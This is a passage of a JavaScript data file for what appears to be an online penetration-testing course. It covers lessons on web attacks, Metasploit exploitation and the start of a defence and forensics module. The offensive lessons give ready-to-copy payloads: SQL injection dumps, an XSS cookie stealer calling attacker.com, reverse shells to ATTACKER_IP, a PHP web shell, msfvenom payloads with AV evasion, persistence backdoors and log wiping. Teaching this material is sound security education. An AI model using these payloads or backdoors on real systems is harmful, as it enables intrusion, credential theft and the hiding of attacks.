class="copy-btn" onclick="ZT_copy(this)">COPY</button"># curl — command-line HTTP testing
curl http://example.com                              # GET
curl -X POST http://example.com/login                # POST
curl -d "user=admin&pass=password" http://site/login # POST with data
curl -H "Cookie: session=abc123" http://site/admin   # With cookie
curl -v http://example.com                           # Verbose (all headers)
curl -k https://example.com                          # Ignore SSL errors</div>`},
  2:{title:'SQL Injection I: Authentication Bypass',duration:'40 min',difficulty:'Intermediate',html:`<h1>Lesson 32: SQL Injection I — Authentication Bypass</h1><div class="lesson-meta"><span>⏱ 40 min</span><span>🎯 Intermediate</span><span>📦 Module 04 · Lesson 2/10</span></div><div class="terminal"><div class="terminal-bar"><span class="t-dot t-red"></span><span class="t-dot t-amb"></span><span class="t-dot t-grn"></span><span class="terminal-title">sqli_auth_bypass</span></div><div class="terminal-body"><span class="output"># Vulnerable PHP code:</span><br><span class="err">$q = "SELECT * FROM users WHERE user='$user' AND pass='$pass'";</span><br><br><span class="output"># Normal:  user=admin, pass=password123</span><br><span class="output">SELECT * FROM users WHERE user='admin' AND pass='password123'</span><br><br><span class="hl"># SQLi:  user=admin'-- ,  pass=anything</span><br><span class="hl">SELECT * FROM users WHERE user='admin'--' AND pass='anything'</span><br><span class="hl"># -- comments out the rest! Password check is GONE.</span></div></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Authentication bypass payloads
admin'--
admin'#
' OR '1'='1'--
' OR 1=1--

# Test if vulnerable: add ' to any input
# If you get a database error → likely vulnerable

# sqlmap (authorised targets only!)
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/login" --data="user=test&pass=test"
sqlmap -u "http://target.com/page.php?id=1" --dbs          # List databases
sqlmap -u "http://target.com/page.php?id=1" -D db --tables  # List tables
sqlmap -u "http://target.com/page.php?id=1" -D db -T users --dump</div>`},
  3:{title:'SQL Injection II: UNION Attacks',duration:'35 min',difficulty:'Advanced',html:`<h1>Lesson 33: SQL Injection II — UNION Attacks</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Advanced</span><span>📦 Module 04 · Lesson 3/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Step 1: Find number of columns
?id=1 ORDER BY 1--  ✓
?id=1 ORDER BY 2--  ✓
?id=1 ORDER BY 3--  ✓
?id=1 ORDER BY 4--  ✗ Error! → 3 columns

# Step 2: Find visible columns
?id=-1 UNION SELECT 1,2,3--
# Numbers that appear on screen = injectable

# Step 3: Extract database info
?id=-1 UNION SELECT database(),user(),version()--

# Step 4: List all tables
?id=-1 UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--

# Step 5: List columns
?id=-1 UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--

# Step 6: Dump data!
?id=-1 UNION SELECT username,password,email FROM users--</div>`},
  4:{title:'Cross-Site Scripting (XSS)',duration:'35 min',difficulty:'Intermediate',html:`<h1>Lesson 34: Cross-Site Scripting (XSS)</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Intermediate</span><span>📦 Module 04 · Lesson 4/10</span></div><table><tr><th>Type</th><th>Description</th><th>Persistence</th></tr><tr><td>Reflected</td><td>Payload in URL, returned in response</td><td>Non-persistent</td></tr><tr><td>Stored</td><td>Payload saved to DB, served to ALL users</td><td>Persistent — most dangerous</td></tr><tr><td>DOM-based</td><td>Executed via client-side JS</td><td>Varies</td></tr></table><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Basic test payloads
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>

# Cookie stealer
<script>new Image().src="http://attacker.com/steal?c="+document.cookie;</script>

# Defence: Content Security Policy (CSP), output encoding
# Never trust user input — always encode output</div>`},
  5:{title:'IDOR: Insecure Direct Object References',duration:'25 min',difficulty:'Intermediate',html:`<h1>Lesson 35: IDOR — Insecure Direct Object References</h1><div class="lesson-meta"><span>⏱ 25 min</span><span>🎯 Intermediate</span><span>📦 Module 04 · Lesson 5/10</span></div><p>IDOR occurs when an app uses user-supplied input to access objects without verifying you own them.</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Classic IDOR
# Your profile: https://example.com/profile?id=1001
# Change to:    https://example.com/profile?id=1002
# If app doesn't verify ownership → you see someone else's profile

# IDOR in file downloads
/download?file=invoice_1001.pdf  → change to invoice_1002.pdf

# IDOR in API
GET /api/v1/users/1001/messages → change 1001 to 1002

# Testing methodology:
# 1. Create two accounts (A and B)
# 2. Note all IDs in Account A requests
# 3. Use Account B session
# 4. Try Account A object IDs → if accessible: IDOR confirmed</div>`},
  6:{title:'Command Injection: Executing System Commands',duration:'30 min',difficulty:'Advanced',html:`<h1>Lesson 36: Command Injection</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Advanced</span><span>📦 Module 04 · Lesson 6/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Command chaining operators:
;     # Run second command regardless
&&    # Run second if first succeeds
||    # Run second if first FAILS
|     # Pipe output to second command

# Payloads
ip=8.8.8.8; whoami
ip=8.8.8.8; cat /etc/passwd
ip=8.8.8.8; id && hostname

# Reverse shell via command injection
ip=8.8.8.8; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# On your machine (catch the shell):
nc -lvnp 4444

# URL encoded semicolon: %3B
8.8.8.8%3Bcat%20/etc/passwd</div><div class="warning-box">⚠️ Command injection often achieves full RCE (Remote Code Execution) — the highest severity vulnerability possible in web applications.</div>`},
  7:{title:'CSRF: Cross-Site Request Forgery',duration:'25 min',difficulty:'Intermediate',html:`<h1>Lesson 37: CSRF — Cross-Site Request Forgery</h1><div class="lesson-meta"><span>⏱ 25 min</span><span>🎯 Intermediate</span><span>📦 Module 04 · Lesson 7/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Attack flow:
# 1. User is logged into bank.com
# 2. User visits evil.com
# 3. evil.com has a hidden form:

<form action="https://bank.com/transfer" method="POST" id="csrf">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>

# 4. Browser sends request WITH user's bank.com cookies
# 5. Bank processes it as legitimate

# Testing: Remove the CSRF token from a request
# If it still works → CSRF vulnerability!</div><div class="highlight-box">💡 <strong>Defence:</strong> CSRF tokens — unique random values generated per session that must be present in every state-changing request. An attacker can't know the token.</div>`},
  8:{title:'File Upload Vulnerabilities: Web Shells',duration:'35 min',difficulty:'Advanced',html:`<h1>Lesson 38: File Upload Vulnerabilities</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Advanced</span><span>📦 Module 04 · Lesson 8/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Minimal PHP web shell
<?php system($_GET['cmd']); ?>

# Usage after upload:
http://target.com/uploads/shell.php?cmd=id
# Output: uid=33(www-data) gid=33(www-data)

# Filter bypass techniques:

# 1. Change extension
shell.php → shell.php5, shell.phtml, shell.phar

# 2. Double extension
shell.php.jpg   (some servers still execute .php)

# 3. Null byte (older systems)
shell.php%00.jpg

# 4. Change Content-Type header
# Set: Content-Type: image/jpeg  (instead of application/x-php)

# 5. Magic bytes — add JPEG header to PHP file
GIF89a;
<?php system($_GET['cmd']); ?>

# Upgrade to reverse shell via web shell
?cmd=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</div>`},
  9:{title:'Directory Traversal: Escaping the Web Root',duration:'25 min',difficulty:'Intermediate',html:`<h1>Lesson 39: Directory Traversal</h1><div class="lesson-meta"><span>⏱ 25 min</span><span>🎯 Intermediate</span><span>📦 Module 04 · Lesson 9/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Basic traversal
?file=../../../etc/passwd
?file=../../../etc/shadow
?file=../../../home/admin/.ssh/id_rsa    # SSH key!
?file=../../../var/www/html/config.php   # Web app config

# Encoding bypasses (when ../ is filtered)
%2e%2e%2f  → ../
..%2f      → ../
%2e%2e/    → ../
..././      → ../ (filter removes ../ but leaves result)

# curl test
curl "http://target.com/download.php?file=../../../etc/passwd"

# High-value targets:
# /etc/passwd         → User list
# /etc/shadow         → Password hashes (need root)
# /proc/self/environ  → Environment vars (may contain secrets)
# ~/.bash_history     → Command history</div>`},
  10:{title:'The OWASP Top 10',duration:'30 min',difficulty:'Beginner',html:`<h1>Lesson 40: The OWASP Top 10</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Beginner</span><span>📦 Module 04 · Lesson 10/10</span></div><table><tr><th>#</th><th>Category</th><th>Description</th></tr><tr><td>A01</td><td>Broken Access Control</td><td>Users act outside intended permissions (IDOR, priv esc)</td></tr><tr><td>A02</td><td>Cryptographic Failures</td><td>Weak encryption, plaintext data, MD5 passwords</td></tr><tr><td>A03</td><td>Injection</td><td>SQL, Command, LDAP, NoSQL injection</td></tr><tr><td>A04</td><td>Insecure Design</td><td>Missing security controls by design</td></tr><tr><td>A05</td><td>Security Misconfiguration</td><td>Default creds, open S3 buckets, debug mode in prod</td></tr><tr><td>A06</td><td>Vulnerable Components</td><td>Outdated libraries with known CVEs</td></tr><tr><td>A07</td><td>Authentication Failures</td><td>Weak passwords, no MFA, session issues</td></tr><tr><td>A08</td><td>Software Integrity Failures</td><td>Insecure CI/CD, unsigned packages</td></tr><tr><td>A09</td><td>Logging & Monitoring Failures</td><td>Not detecting or alerting on attacks</td></tr><tr><td>A10</td><td>SSRF</td><td>Server-Side Request Forgery</td></tr></table><div class="highlight-box">🏆 <strong>MODULE 04 COMPLETE!</strong> You now understand HTTP, SQLi, XSS, IDOR, Command Injection, CSRF, File Upload, Directory Traversal and the full OWASP Top 10. Module 05: Exploitation & Metasploit!</div>`},
}};

window.MOD05 = { id:'mod05', title:'Exploitation & Metasploit', lessons:{
  1:{title:'CVEs & the Exploitation Mindset',duration:'30 min',difficulty:'Intermediate',html:`<h1>Lesson 41: CVEs & the Exploitation Mindset</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Intermediate</span><span>📦 Module 05 · Lesson 1/10</span></div><p>Exploitation is where identified vulnerabilities are leveraged to gain access. Before using Metasploit, you must understand CVEs — how vulnerabilities are classified and found.</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># CVE format: CVE-YEAR-NUMBER
CVE-2017-0144  = EternalBlue (MS17-010) — SMB RCE
CVE-2021-44228 = Log4Shell — Java Log4j RCE (CVSS 10.0)
CVE-2014-6271  = Shellshock — Bash RCE
CVE-2014-0160  = Heartbleed — OpenSSL info disclosure
CVE-2019-0708  = BlueKeep — RDP pre-auth RCE

# CVSS Scores:
# 0.0–3.9  = Low
# 4.0–6.9  = Medium
# 7.0–8.9  = High
# 9.0–10.0 = CRITICAL

# Find exploits
searchsploit eternalblue
searchsploit "apache 2.4"
searchsploit -x 42315   # Examine exploit code

# In Metasploit
search CVE-2021-44228
search type:exploit name:eternalblue</div>`},
  2:{title:'Metasploit Framework: Core Concepts',duration:'40 min',difficulty:'Intermediate',html:`<h1>Lesson 42: Metasploit Framework</h1><div class="lesson-meta"><span>⏱ 40 min</span><span>🎯 Intermediate</span><span>📦 Module 05 · Lesson 2/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Start Metasploit
msfconsole -q

# Core components:
# EXPLOITS   → Code that exploits a vulnerability
# PAYLOADS   → Code that runs on target after exploitation
# AUXILIARY  → Scanners, fuzzers, support modules
# POST       → Post-exploitation modules
# ENCODERS   → Obfuscate payloads (AV evasion)

# Basic EternalBlue workflow:
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit > show options
msf6 exploit > set RHOSTS 192.168.1.50
msf6 exploit > set LHOST  192.168.1.100
msf6 exploit > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit > run</div>`},
  3:{title:'Meterpreter: Post-Exploitation Shell',duration:'35 min',difficulty:'Intermediate',html:`<h1>Lesson 43: Meterpreter</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Intermediate</span><span>📦 Module 05 · Lesson 3/10</span></div><p>Meterpreter is Metasploit's advanced in-memory payload — it runs entirely in RAM, never touching disk, making it hard to detect.</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Core commands
sysinfo           # System information
getuid            # Current user
getpid            # Current process ID
ps                # List running processes
migrate 1234      # Migrate to PID 1234

# File system
pwd | ls | cd /tmp
download /etc/passwd          # Download to attacker
upload payload.exe C:\\Temp   # Upload to target

# Windows-specific
getsystem         # Auto privilege escalation attempt
hashdump          # Dump Windows password hashes (NTLM)

# Networking
ifconfig          # Network interfaces
portfwd add -l 8080 -p 80 -r 10.10.10.5   # Port forward

# Session management
background        # Background current session
sessions -l       # List all sessions
sessions -i 1     # Interact with session 1</div>`},
  4:{title:'Payload Generation with msfvenom',duration:'35 min',difficulty:'Advanced',html:`<h1>Lesson 44: msfvenom — Payload Generation</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Advanced</span><span>📦 Module 05 · Lesson 4/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Syntax: msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <file>

# Windows reverse shell (.exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell (.elf)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o evil.apk

# With encoding (basic AV evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Set up listener to catch connection
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run</div>`},
  5:{title:'Privilege Escalation: Linux',duration:'40 min',difficulty:'Advanced',html:`<h1>Lesson 45: Privilege Escalation — Linux</h1><div class="lesson-meta"><span>⏱ 40 min</span><span>🎯 Advanced</span><span>📦 Module 05 · Lesson 5/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Step 1: Who am I and what can I do?
whoami && id && sudo -l
uname -a              # Kernel version
cat /etc/os-release

# Step 2: Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# → Check GTFOBins (gtfobins.github.io) for each result

# Step 3: Exploit sudo misconfigs
# Example: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'     # Escape to root shell!

# (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/bash \; -quit

# Step 4: Writable /etc/passwd
# Add root user if writable:
openssl passwd -1 "hacked"   # Generate hash
echo 'hacked:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked

# Step 5: LinPEAS automation
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</div>`},
  6:{title:'Privilege Escalation: Windows',duration:'40 min',difficulty:'Advanced',html:`<h1>Lesson 46: Privilege Escalation — Windows</h1><div class="lesson-meta"><span>⏱ 40 min</span><span>🎯 Advanced</span><span>📦 Module 05 · Lesson 6/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Enumeration
whoami /all                   # User + privileges
net user                      # All local users
net localgroup administrators # Who's admin?
systeminfo                    # OS version + hotfixes
tasklist                      # Running processes
netstat -ano                  # Connections + PIDs

# Unquoted service paths
wmic service get name,pathname | findstr /i "c:\\" | findstr /i /v """

# Scheduled tasks
schtasks /query /fo LIST /v

# Registry autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Token impersonation (if SeImpersonatePrivilege)
whoami /priv    # Look for SeImpersonatePrivilege
# Use: PrintSpoofer, JuicyPotato, RoguePotato

# WinPEAS automation
winpeas.exe</div>`},
  7:{title:'Password Attacks: Cracking & Spraying',duration:'35 min',difficulty:'Intermediate',html:`<h1>Lesson 47: Password Attacks</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Intermediate</span><span>📦 Module 05 · Lesson 7/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Hashcat — GPU password cracking
hashcat -m 0    hashes.txt rockyou.txt   # MD5
hashcat -m 100  hashes.txt rockyou.txt   # SHA-1
hashcat -m 1000 hashes.txt rockyou.txt   # NTLM (Windows)
hashcat -m 1800 hashes.txt rockyou.txt   # SHA-512crypt (Linux)

# Rules-based mutation
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hashes.txt

# Hydra — online brute force
hydra -l admin -P rockyou.txt ssh://192.168.1.50
hydra -L users.txt -P passlist.txt http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"
hydra -l admin -P rockyou.txt rdp://192.168.1.50

# Password spraying (one password, many users — avoids lockout)
hydra -L users.txt -p Company2024! ssh://192.168.1.50</div>`},
  8:{title:'Lateral Movement & Pivoting',duration:'35 min',difficulty:'Advanced',html:`<h1>Lesson 48: Lateral Movement & Pivoting</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Advanced</span><span>📦 Module 05 · Lesson 8/10</span></div><p>After compromising one host, lateral movement uses it as a stepping stone to reach other systems in the network.</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Pass-the-Hash (Windows — use NTLM hash without cracking)
pth-winexe -U 'admin%aad3b435b51404ee:NTLM_HASH' //192.168.1.50 cmd.exe

# psexec with credentials
impacket-psexec admin:password@192.168.1.50

# SSH pivoting
# Access 10.10.10.5 (internal) via compromised 192.168.1.100:
ssh -L 8080:10.10.10.5:80 user@192.168.1.100
# Now visit localhost:8080 to reach internal server

# Metasploit pivoting
# After getting meterpreter session on 192.168.1.100:
meterpreter > run autoroute -s 10.10.10.0/24
msf6 > use auxiliary/server/socks_proxy
# Now route all Metasploit traffic through the pivot</div>`},
  9:{title:'Persistence & Backdoors',duration:'30 min',difficulty:'Advanced',html:`<h1>Lesson 49: Persistence & Backdoors</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Advanced</span><span>📦 Module 05 · Lesson 9/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Linux persistence techniques

# 1. SSH key backdoor
echo "ATTACKER_PUBLIC_KEY" >> /root/.ssh/authorized_keys

# 2. Cron job backdoor
echo "*/5 * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> /etc/crontab

# 3. SUID shell backdoor
cp /bin/bash /tmp/.hidden_bash
chmod +s /tmp/.hidden_bash
# Victim runs: /tmp/.hidden_bash -p  → root shell

# Windows persistence

# 1. Registry autorun
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\shell.exe"

# 2. Scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\shell.exe" /sc minute /mo 5

# 3. Meterpreter persistence module
meterpreter > run persistence -S -i 30 -p 4444 -r ATTACKER_IP</div>`},
  10:{title:'Covering Tracks & Anti-Forensics',duration:'30 min',difficulty:'Advanced',html:`<h1>Lesson 50: Covering Tracks & Anti-Forensics</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Advanced</span><span>📦 Module 05 · Lesson 10/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Clear Linux logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
cat /dev/null > ~/.bash_history

# Disable bash history for current session
unset HISTFILE
export HISTSIZE=0

# Clear specific log lines (more surgical)
sed -i '/192.168.1.100/d' /var/log/auth.log   # Remove lines with your IP

# Timestomping — change file timestamps to blend in
touch -d "2023-01-01 12:00:00" malicious_file.sh

# Windows event log clearing (requires admin)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Meterpreter — clear event logs
meterpreter > clearev</div><div class="highlight-box">🏆 <strong>MODULE 05 COMPLETE!</strong> You've mastered exploitation — CVEs, Metasploit, Meterpreter, msfvenom, Linux/Windows priv esc, password attacks, lateral movement, persistence, and covering tracks. Final module: Defense & Forensics!</div>`},
}};

window.MOD06 = { id:'mod06', title:'Defense & Forensics', lessons:{
  1:{title:'Blue Team Fundamentals: Defense in Depth',duration:'30 min',difficulty:'Beginner',html:`<h1>Lesson 51: Blue Team Fundamentals</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Beginner</span><span>📦 Module 06 · Lesson 1/10</span></div><p>The Blue Team defends systems against attacks. Defense in Depth is the core strategy — multiple overlapping layers of security so that if one fails, others still protect the asset.</p><h2>Defence in Depth Layers</h2><table><tr><th>Layer</th><th>Controls</th></tr><tr><td>Physical</td><td>Locked server rooms, access badges, CCTV</td></tr><tr><td>Network</td><td>Firewalls, IDS/IPS, network segmentation, VPNs</td></tr><tr><td>Host</td><td>Antivirus, EDR, host firewall, patch management</td></tr><tr><td>Application</td><td>WAF, input validation, secure coding, SAST/DAST</td></tr><tr><td>Data</td><td>Encryption at rest, DLP, access controls</td></tr><tr><td>Identity</td><td>MFA, least privilege, PAM, SSO</td></tr></table><h2>The Security Triad: CIA</h2><ul><li><strong>Confidentiality:</strong> Only authorised parties access data (encryption, access controls)</li><li><strong>Integrity:</strong> Data is not altered without authorisation (hashing, digital signatures)</li><li><strong>Availability:</strong> Systems are accessible when needed (redundancy, backups, DDoS protection)</li></ul>`},
  2:{title:'Log Analysis: Finding Attacks in Log Files',duration:'35 min',difficulty:'Intermediate',html:`<h1>Lesson 52: Log Analysis</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Intermediate</span><span>📦 Module 06 · Lesson 2/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Key Linux log files
/var/log/auth.log       # SSH logins, sudo usage, auth failures
/var/log/syslog         # General system messages
/var/log/kern.log       # Kernel messages
/var/log/apache2/access.log   # Web server access
/var/log/apache2/error.log    # Web server errors
/var/log/fail2ban.log   # Fail2ban activity

# Finding brute force attacks
grep "Failed password" /var/log/auth.log | head -20
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Find successful logins
grep "Accepted password" /var/log/auth.log
grep "Accepted publickey" /var/log/auth.log

# Find web scanning / injection attempts
grep "union\|select\|../\|<script" /var/log/apache2/access.log -i
grep " 404 " /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn

# Count requests by IP
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20</div>`},
  3:{title:'SIEM Fundamentals: Splunk & ELK',duration:'35 min',difficulty:'Intermediate',html:`<h1>Lesson 53: SIEM Fundamentals</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Intermediate</span><span>📦 Module 06 · Lesson 3/10</span></div><p>SIEM (Security Information and Event Management) systems aggregate logs from all sources across an environment, correlate events to find threats, and alert security teams.</p><h2>How SIEM Works</h2><ol><li><strong>Collection:</strong> Agents on systems forward logs to the SIEM centralised platform</li><li><strong>Normalisation:</strong> Raw logs are parsed into structured, searchable fields</li><li><strong>Correlation:</strong> Rules detect patterns across multiple log sources (e.g., port scan + failed login + successful login from same IP)</li><li><strong>Alerting:</strong> Triggers notifications when rules match</li><li><strong>Investigation:</strong> Analysts drill into alerts to determine if real attacks occurred</li></ol><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Splunk Search Processing Language (SPL) examples

# Find all failed logins
index=windows EventCode=4625 | stats count by Account_Name, IpAddress

# Detect brute force (10+ failures in 5 min)
index=windows EventCode=4625
| bucket _time span=5m
| stats count by _time, IpAddress
| where count > 10

# Find privilege escalation attempts
index=windows (EventCode=4672 OR EventCode=4673)
| table _time, Account_Name, Privileges

# Elk Stack (open-source alternative to Splunk)
# Elasticsearch + Logstash + Kibana (ELK)
# Filebeat → Logstash → Elasticsearch ← Kibana</div>`},
  4:{title:'Incident Response: The IR Lifecycle',duration:'30 min',difficulty:'Intermediate',html:`<h1>Lesson 54: Incident Response</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Intermediate</span><span>📦 Module 06 · Lesson 4/10</span></div><h2>The IR Lifecycle (NIST SP 800-61)</h2><ol><li><strong>Preparation:</strong> Build the IR team, develop playbooks, deploy detection tools before incidents happen</li><li><strong>Detection & Analysis:</strong> Identify potential incidents from alerts, logs, user reports. Triage severity.</li><li><strong>Containment:</strong> Stop the spread. Isolate affected systems. Short-term (immediate isolation) and long-term (network segmentation).</li><li><strong>Eradication:</strong> Remove the threat. Delete malware, patch vulnerabilities, revoke compromised credentials.</li><li><strong>Recovery:</strong> Restore systems from clean backups. Monitor closely for re-infection.</li><li><strong>Lessons Learned:</strong> Post-incident review. What happened? What can be improved?</li></ol><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Linux — initial incident triage
date                           # Timestamp everything
who                            # Currently logged in users
w                              # Active sessions
last | head -20                # Recent logins
ps auxf                        # Process tree
netstat -tulpn                 # Network connections
ls -la /tmp /var/tmp           # Dropper locations
find / -mtime -1 2>/dev/null   # Files modified in last 24h
crontab -l && cat /etc/crontab # Scheduled tasks</div>`},
  5:{title:'Digital Forensics: Disk & Memory Analysis',duration:'40 min',difficulty:'Intermediate',html:`<h1>Lesson 55: Digital Forensics</h1><div class="lesson-meta"><span>⏱ 40 min</span><span>🎯 Intermediate</span><span>📦 Module 06 · Lesson 5/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Disk Imaging (preserve evidence — never work on originals!)
# dd — bit-for-bit copy
dd if=/dev/sda of=/evidence/disk.img bs=4M conv=noerror,sync
# Verify integrity:
md5sum /dev/sda > original.md5
md5sum /evidence/disk.img > copy.md5
diff original.md5 copy.md5    # Should be identical

# Autopsy (GUI forensics tool)
# Open: autopsy in terminal → web interface at localhost:9999

# Volatility — memory forensics
# Analyse a memory dump:
volatility -f memory.dmp imageinfo          # Identify OS profile
volatility -f memory.dmp --profile=Win10x64 pslist     # Process list
volatility -f memory.dmp --profile=Win10x64 pstree     # Process tree
volatility -f memory.dmp --profile=Win10x64 netscan    # Network connections
volatility -f memory.dmp --profile=Win10x64 dumpfiles  # Extract files</div>`},
  6:{title:'Network Forensics: Packet Analysis',duration:'30 min',difficulty:'Intermediate',html:`<h1>Lesson 56: Network Forensics</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Intermediate</span><span>📦 Module 06 · Lesson 6/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Capture traffic for forensics
tcpdump -i eth0 -w capture.pcap          # Capture all traffic
tcpdump -i eth0 -w capture.pcap port 80  # HTTP only
tcpdump -i eth0 -w capture.pcap host 192.168.1.50

# Wireshark analysis for forensics
# Find credentials in HTTP traffic:
http.request.method == "POST"            # POST requests (login forms)
http contains "password"                 # Search for password string

# Find DNS tunneling
dns.qry.name.len > 50                    # Unusually long DNS queries

# Detect port scans
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN packets
# Many SYN to different ports = port scan

# Extract files from capture
# File → Export Objects → HTTP  (extract downloaded files)

# Network Miner (automated credential extraction)
# GUI tool — drag and drop .pcap file</div>`},
  7:{title:'Malware Analysis: Static & Dynamic',duration:'40 min',difficulty:'Advanced',html:`<h1>Lesson 57: Malware Analysis</h1><div class="lesson-meta"><span>⏱ 40 min</span><span>🎯 Advanced</span><span>📦 Module 06 · Lesson 7/10</span></div><h2>Static Analysis (no execution)</h2><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Hash the sample first (for threat intel lookup)
md5sum malware.exe
sha256sum malware.exe
# Search hash on VirusTotal: virustotal.com

# file command — identify file type
file malware.exe
file malware.bin

# strings — extract readable text
strings malware.exe | grep -i "http\|ftp\|cmd\|powershell"
strings malware.exe | grep -E "[0-9]{1,3}\.[0-9]{1,3}"  # IPs

# PE analysis (Windows executables)
# Tool: pestudio, PEview, Detect-It-Easy
# Check: imports, sections, packer detection

# YARA rules — pattern matching
yara rule.yar malware.exe</div><h2>Dynamic Analysis (controlled execution)</h2><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># ALWAYS use isolated VM with no internet access!
# Take a clean snapshot BEFORE running malware

# Monitor file system changes
inotifywait -m /tmp /var/tmp &   # Linux

# Monitor network connections while running
tcpdump -i eth0 -w capture.pcap &
./malware   # Execute in controlled environment
# Stop capture → analyse with Wireshark

# Online sandboxes (safe automated analysis)
# Cuckoo Sandbox (self-hosted)
# any.run (online, interactive)
# hybrid-analysis.com</div>`},
  8:{title:'Hardening Linux Systems',duration:'35 min',difficulty:'Intermediate',html:`<h1>Lesson 58: Hardening Linux Systems</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Intermediate</span><span>📦 Module 06 · Lesson 8/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># 1. Keep systems patched
sudo apt update && sudo apt upgrade -y

# 2. Disable unused services
systemctl disable telnet
systemctl disable rsh
systemctl stop avahi-daemon

# 3. SSH hardening (/etc/ssh/sshd_config)
PermitRootLogin no               # Never allow root SSH
PasswordAuthentication no        # Keys only
